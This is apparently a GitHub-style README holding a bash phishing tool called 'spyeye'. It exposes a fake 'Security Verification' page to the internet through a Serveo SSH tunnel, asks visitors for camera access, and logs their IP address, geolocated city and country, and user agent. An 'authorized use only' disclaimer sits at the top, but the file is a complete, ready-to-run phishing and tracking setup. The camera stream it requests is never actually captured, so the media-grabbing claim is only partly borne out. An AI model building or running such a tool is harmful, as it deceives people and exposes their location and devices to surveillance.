# spyeye
Get usermedia ,location abd IP
#!/bin/bash

# Authorized Penetration Testing Script
# Collects: IP, Approximate Location, and Media (Camera Snapshot)
# Tunneling: Serveo (SSH-based)
# Legal Use Only - Unauthorized use is illegal.

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Create a directory for logs
LOG_DIR="phish_logs"
mkdir -p "$LOG_DIR"

# Start PHP server (serving the phishing page)
echo -e "${GREEN}[*] Starting PHP server on port 8080...${NC}"
php -S 127.0.0.1:8080 -t "$PWD/phish_page" > /dev/null 2>&1 &

# Serveo Tunnel (SSH port forwarding)
echo -e "${GREEN}[*] Starting Serveo tunnel...${NC}"
ssh -R 80:localhost:8080 serveo.net 2>&1 | tee "$LOG_DIR/serveo.log" &
sleep 5 # Wait for Serveo to initialize

# Extract Serveo URL
SERVEO_URL=$(grep -o "https://[a-z0-9]*\.serveo\.net" "$LOG_DIR/serveo.log")
echo -e "${YELLOW}[+] Phishing URL: $SERVEO_URL ${NC}"

# Fake "Media Access" Page (HTML/JS to request camera)
mkdir -p phish_page
cat > phish_page/index.html <<EOF
<!DOCTYPE html>
<html>
<head>
    <title>Security Verification</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }
        button { padding: 10px 20px; font-size: 16px; }
    </style>
</head>
<body>
    <h1>Security Verification Required</h1>
    <p>Click "Allow" to verify your identity.</p>
    <button onclick="getMedia()">Allow</button>
    <script>
        // Collect IP (via fetch to backend)
        fetch('/ip').then(res => res.text()).then(ip => {
            console.log('IP:', ip);
        });

        // Request Camera Access
        function getMedia() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    alert("Verification complete. Thank you!");
                    window.location.href = "/close";
                })
                .catch(err => {
                    alert("Error: Camera access denied.");
                });
        }
    </script>
</body>
</html>
EOF

# Backend to log IP and approximate location
cat > phish_page/ip.php <<EOF
<?php
\$ip = \$_SERVER['REMOTE_ADDR'];
\$geo = json_decode(file_get_contents("http://ip-api.com/json/\$ip"));
file_put_contents("../$LOG_DIR/ip_log.txt", 
    "IP: \$ip\n" .
    "Location: " . (\$geo->city ?? "Unknown") . ", " . (\$geo->country ?? "Unknown") . "\n" .
    "User Agent: " . \$_SERVER['HTTP_USER_AGENT'] . "\n\n",
    FILE_APPEND
);
echo \$ip;
?>
EOF

# Cleanup handler
cat > phish_page/close.php <<EOF
<?php
header("Location: https://example.com");
exit();
?>
EOF

# Wait for user to terminate
echo -e "${RED}\n[!] Press Ctrl+C to stop the phishing server.${NC}"
echo -e "${YELLOW}[*] Logs will be saved in: $LOG_DIR/${NC}"
wait
